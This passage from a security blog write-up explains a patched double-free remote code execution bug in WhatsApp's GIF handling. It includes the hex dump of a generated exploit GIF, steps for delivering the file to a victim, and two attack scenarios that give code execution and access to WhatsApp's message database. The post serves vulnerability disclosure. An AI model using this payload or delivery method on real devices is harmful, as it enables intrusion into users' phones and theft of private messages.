+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>notroot@osboxes:~/Desktop/gif$ make
+.....
+.....
+.....
+notroot@osboxes:~/Desktop/gif$ ./exploit exploit.gif
+buffer = 0x7ffc586cd8b0 size = 266
+47 49 46 38 39 61 18 00 0A 00 F2 00 00 66 CC CC
+FF FF FF 00 00 00 33 99 66 99 FF CC 00 00 00 00
+00 00 00 00 00 2C 00 00 00 00 08 00 15 00 00 08
+9C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 84 9C 09 B0
+C5 07 00 00 00 74 DE E4 11 F3 06 0F 08 37 63 40
+C4 C8 21 C3 45 0C 1B 38 5C C8 70 71 43 06 08 1A
+34 68 D0 00 C1 07 C4 1C 34 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 54 12 7C C0 C5 07 00 00 00 EE FF FF 2C 00 00
+00 00 1C 0F 00 00 00 00 2C 00 00 00 00 1C 0F 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 2C 00 00 00 00
+18 00 0A 00 0F 00 01 00 00 3B
+</code></pre></div></div>
+<p>Then copy exploit.gif file and send it as Document with WhatsApp to another WhatsApp user. Take note that it must not be sent as a Media file, otherwise WhatsApp tries to convert it into an MP4 before sending.
+Upon the user receives the malicous GIF file, nothing will happen until the user open WhatsApp Gallery to send a media file to his/her friend.</p>
+
+<h2 id="affected-versions">Affected versions</h2>
+<p>The exploit works well until WhatsApp version 2.19.230. The vulnerability is official patched in WhatsApp version 2.19.244</p>
+
+<p>The exploit works well for Android 8.1 and 9.0, but does not work for Android 8.0 and below. In the older Android versions, double-free could still be triggered. However, because of the malloc calls by the system after the double-free, the app just crashes before reaching to the point that we could control the PC register.</p>
+
+<p>Note that Facebook informed the developer of android-gif-drawable repo about the issue. The fix from Facebook was also merged into the original repo in a commit from August 10th. <a href="https://github.com/koral--/android-gif-drawable/releases/tag/v1.2.18">Version 1.2.18 of android-gif-drawable</a> is safe from the double-free bug.</p>
+
+<h2 id="attack-vectors">Attack vectors</h2>
+<p>With the above exploitation, we can have two attack vectors:</p>
+
+<ol>
+  <li>Local privilege escaltion (from a user app to WhatsApp): A malicious app is installed on the Android device. The app collects addresses of zygote libraries and generates a malicious GIF file that results in code execution in WhatsApp context. This allows the malware app to steal files in WhatsApp sandbox including message database.</li>
+  <li>Remote code execution: Pairing with an application that has an remote memory information disclosure vulnerability (e.g. browser), the attacker can collect the addresses of zygote libraries and craft a malicious GIF file to send it to the user via WhatsApp (must be as an attachment, not as an image through Gallery Picker). As soon as the user opens the Gallery view in WhatsApp (who never sends media files to friends, right?), the GIF file will trigger a remote shell in WhatsApp context.</li>
+</ol>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hacking" class="page__taxonomy-item" rel="tag">Hacking</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-10-02T04:24:15+00:00">October 02, 2019</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=How+a+double-free+bug+in+WhatsApp+turns+to+RCE%20https%3A%2F%2Fawakened1712.github.io%2Fhacking%2Fhacking-whatsapp-gif-rce%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fawakened1712.github.io%2Fhacking%2Fhacking-whatsapp-gif-rce%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=https%3A%2F%2Fawakened1712.github.io%2Fhacking%2Fhacking-whatsapp-gif-rce%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fawakened1712.github.io%2Fhacking%2Fhacking-whatsapp-gif-rce%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/hacking/hacking-wechat-dos/" class="pagination--pager" title="DoS Wechat with an emoji
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Leave a Comment</h4>
+      <section id="disqus_thread"></section>
+    
+</div>
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hacking/hacking-wechat-dos/" rel="permalink">DoS Wechat with an emoji
+</a>
+      
+    </h2>
+    <p class="page__meta">
+      
+        <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-05-14T09:22:33+00:00">May 14, 2019 </time>&emsp;
+      
+      <i class="fa fa-clock" aria-hidden="true"></i>&nbsp;
+
+
+
+
+  1 minute read
+
+    </p>
+    <p class="archive__item-excerpt" itemprop="description">This DoS bug was reported to Tencent, but they decided not to fix because it’s not critical. The Common Vulnerabilities and Exposures (CVE) Program has assig...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/img/RB%20App%20Checker.png"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/programming/programming-iOS-app-info/" rel="permalink">RB App Checker
+</a>
+      
+    </h2>
+    <p class="page__meta">
+      
+        <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2018-06-06T09:22:33+00:00">June 06, 2018 </time>&emsp;
+      
+      <i class="fa fa-clock" aria-hidden="true"></i>&nbsp;
+
+
+
+
+  less than 1 minute read
+
+    </p>
+    <p class="archive__item-excerpt" itemprop="description">This tiny yet powerful app lets us check the iOS application for the certificates, requirements and entitlements, embedded provisioning profiles, auxiliary e...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/img/android.png"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hacking/hacking-install-ca-android/" rel="permalink">Install a trusted CA in Android N
+</a>
+      
+    </h2>
+    <p class="page__meta">
+      
+        <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2018-06-01T04:24:15+00:00">June 01, 2018 </time>&emsp;
+      
+      <i class="fa fa-clock" aria-hidden="true"></i>&nbsp;
+
+
+
+
+  1 minute read
+
+    </p>
+    <p class="archive__item-excerpt" itemprop="description">It’s very trivial to install a user-trusted certificate on Android. Under Settings -&gt; Security you can install new trusted certificates. However, this cre...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/img/android.png"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/programming/programming-handy-android-code-snippets/" rel="permalink">Handy Android code snippets
+</a>
+      
+    </h2>
+    <p class="page__meta">
+      
+        <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2018-05-18T09:22:33+00:00">May 18, 2018 </time>&emsp;
+      
+      <i class="fa fa-clock" aria-hidden="true"></i>&nbsp;
+
+
+
+
+  less than 1 minute read
+
+    </p>
+    <p class="archive__item-excerpt" itemprop="description">This blog post is a memo of handy Android code snippets that I found particularly useful in programming and hacking.
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+    
+    
+    
+    
+    
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2020 Awakened. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-23264136-3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-23264136-3');
+</script>
+
+
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/hacking/hacking-whatsapp-gif-rce"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://awakened1712.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
